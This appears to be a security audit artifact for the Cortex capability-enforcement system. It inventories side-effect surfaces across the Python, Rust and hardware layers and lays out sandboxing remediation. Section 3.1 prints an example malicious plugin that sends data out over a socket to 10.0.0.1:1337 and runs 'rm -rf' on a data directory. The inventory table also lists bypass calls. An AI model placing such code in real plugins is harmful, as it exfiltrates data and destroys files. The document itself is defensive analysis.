# Gate G: Complete Mediation Effect Surface Inventory & Adversarial Escape Analysis
**Author:** Iradukunda Fils <iradukundafils1@gmail.com>  
**Role:** Systems Architect & Hardware/Software Co-Designer  
**Status:** NORMATIVE AUDIT ARTIFACT (PHASE 13 — GATE G)  
**Date:** August 15, 2026  

---

## 1. Executive Summary & Audit Objective

The formal security model of Cortex (specifically Coq `Soundness.v` and Theorem 3) depends unconditionally on the assumption of **Complete Mediation** (`Epoch_Consistent_Complete_Mediation`). 

This gate (Gate G) conducts a comprehensive **Effect Surface Inventory** and **Adversarial Escape Analysis** across the Python reference kernel (`cortex`), Rust emulator (`cortex-emulator`), and SystemVerilog RTL core (`cortex_stcr_pipeline.sv`).

The goal is to answer the central security question:
> **Can any externally observable side-effect occur outside the ExecutionToken-controlled enforcement boundary?**

---

## 2. Master Effect Surface Inventory Matrix

| Effect Surface Domain | Low-Level OS / API Call | Python Reference Boundary | Rust Emulator Boundary | RTL Hardware Boundary | Token Required? | Logged Evidence? | Bypass Vector Possible? | Current Bypass Status |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| **Filesystem Mutation** | `open(O_WRONLY)`, `write`, `unlink`, `chmod`, `mmap` | `PluginContext.has_capability()` (in-memory) | `std::fs::File` (unrestricted) | STCR Base Address Check | **No** (Direct `open()` call) | **No** | Direct `builtins.open()` call in `BasePlugin.on_event()` | **VULNERABLE (Bypass)** |
| **Filesystem Read** | `open(O_RDONLY)`, `read`, `readdir`, `stat` | Voluntary check | `std::fs::read` | STCR Spatial Mask | **No** | **No** | `pathlib.Path.read_text()` in plugin loop | **VULNERABLE (Bypass)** |
| **Network Socket Outbound** | `socket(AF_INET)`, `connect`, `sendto`, `sendall` | Voluntary check | `std::net::TcpStream` | N/A (Host OS) | **No** | **No** | `import socket; socket.create_connection()` | **VULNERABLE (Bypass)** |
| **Network Socket Listening** | `bind`, `listen`, `accept` | Voluntary check | `std::net::TcpListener` | N/A | **No** | **No** | Raw `socket.bind()` | **VULNERABLE (Bypass)** |
| **Process Execution** | `execve`, `fork`, `posix_spawn`, `subprocess` | Voluntary check | `std::process::Command` | N/A | **No** | **No** | `import os; os.system(...)` or `subprocess.Popen` | **VULNERABLE (Bypass)** |
| **Inter-Process Comm (IPC)** | `shmget`, `mmap(MAP_SHARED)`, `pipe`, `msgget` | Voluntary check | `ipc-channel` / `unix` | N/A | **No** | **No** | `import posix_ipc` / `multiprocessing.shared_memory` | **VULNERABLE (Bypass)** |
| **Native Code / FFI** | `dlopen`, `ctypes.CDLL`, `cffi`, C-extension | In-process execution | `unsafe { ffi() }` | N/A | **No** | **No** | `import ctypes; ctypes.CDLL("libc.so.6")` | **VULNERABLE (Bypass)** |
| **Hardware Access** | `/dev/mem`, `/dev/gpiomem`, MMIO, DMA | Operating System permissions | `memmap2` crate | Hardware STCR pipeline (`eff_trap`) | **Yes** (Only in RTL STCR stage) | Hardware trap signal | Software outside Verilator/RTL wrapper bypasses RTL | **PARTIAL (Hardware Only)** |

---

## 3. Adversarial Escape Analysis by Runtime Layer

### 3.1 Python Reference Kernel (`cortex/plugin.py`)

#### Architectural Finding:
In the Python reference kernel, `BasePlugin` executes inside the **same Python process and GIL context** as the host application. 

The `PluginContext` object provides a helper method `has_capability(cap_name)`:
```python
@dataclass
class PluginContext:
    session_id: str
    granted_capabilities: set[str] | frozenset[str]
    
    def has_capability(self, cap_name: str) -> bool:
        return cap_name in self.granted_capabilities
```

#### Adversarial Escape Path:
Because plugins run un-sandboxed in the host Python process, a malicious or non-cooperative plugin inside `on_event(self, event)` can simply ignore `self.context.has_capability()`:

```python
class MaliciousPlugin(BasePlugin):
    def on_event(self, event: BaseEvent) -> None:
        # BYPASS: Directly invoke Python standard library I/O
        import os
        import socket
        
        # Un-mediated network exfiltration
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("10.0.0.1", 1337))
        s.sendall(b"exfiltrated_data")
        
        # Un-mediated file destruction
        os.system("rm -rf /tmp/cortex_data")
```

#### Conclusion for Python Runtime:
The Python reference implementation currently relies on **voluntary cooperative compliance**, NOT un-bypassable complete mediation. 

---

### 3.2 Rust Emulator Runtime (`cortex-emulator/src/main.rs`)

#### Architectural Finding:
The Rust emulator models STCR pipeline execution and HEC epoch checks in memory. However, Rust worker threads running candidate plugins are compiled into the same host binary.

#### Adversarial Escape Path:
Any Rust module or third-party dependency can issue `std::fs::write` or `std::process::Command::new` without constructing an `ExecutionToken` or dispatching through `cortex_stcr_pipeline`.

---

### 3.3 SystemVerilog RTL Core (`rtl/cortex_stcr_pipeline.sv`)

#### Architectural Finding:
The hardware pipeline strictly mediates capability invocation via opcode `0x01` (`invoke_cap`), enforcing spatial mask and HEC epoch validity. On violation, `eff_trap` is raised and destination registers are zeroed (`64'h0`).

#### Hardware Escape Boundary:
While the STCR hardware pipeline enforces capability checks for instructions routed through its pipeline, it does **not** protect host system memory unless bound to a CPU Physical Memory Protection (PMP) or RISC-V ePMP unit that traps raw load/store instructions outside STCR ranges.

---

## 4. Required Remediation Architecture for Complete Mediation

To close Gate G and satisfy Coq Theorem 3's assumption of `Epoch_Consistent_Complete_Mediation`, Cortex must implement **Un-bypassable Enforcement Boundaries**:

```
                       REMEDIATED ENFORCEMENT BOUNDARY
                                      │
  ┌───────────────────────────────────┼───────────────────────────────────┐
  │                                   │                                   │
Python Sandbox (WASM / Landlock)   Rust Process Isolation               RTL Hardware ePMP / PMP
• Seccomp-BPF Syscall Filter       • OS Process Boundary (fork/exec)    • Hardware Memory Protection
• Restricted Builtins Environment   • IPC via Guarded Pipe Ring          • Trap on Raw Memory Access
  │                                   │                                   │
  └───────────────────────────────────┴───────────────────────────────────┘
                                      │
                                      ▼
                        MANDATORY EXECUTION TOKEN GATE
```

### 4.1 Process & Syscall Sandboxing (Linux Profile A Target)
1. **Linux `landlock` LSM & `seccomp-bpf`**: Restrict untrusted plugin worker processes from executing direct effectful system calls (`open` write, `connect()`, `execve()`, `socket()`) unless mediated by the host supervisor over a narrow IPC socket.
2. **WASM Runtime Sandbox (Profile B Target)**: Run plugins inside a WebAssembly engine (`wasmtime` / `wasmer`) where host imports strictly expose only `cortex_invoke_capability(intent)`.

### 4.2 Mandatory ExecutionToken Interceptor Gate
All side-effect drivers (FileDriver, NetworkDriver, ProcessDriver) **MUST** execute strictly within the Host Gateway TCB. Untrusted workers submit raw `SignedIntent` requests over IPC; the Gateway evaluates capabilities, mints the internal `ExecutionToken`, and actuates effects inside its own permission envelope.

---

## 5. Gate G Conclusion & Status

* **Complete Mediation Status**: **SPECIFIED / IN REMEDIATION** (Normative inventory and Profile A TCB architecture specified in `gate_g_remediation_specification.md`).
* **Next Action**: Implement Profile A worker sandbox, execute expanded G-TEST-001..012 suite, and re-run Gates H, I, and J certification pipeline across the hardened worker boundary.
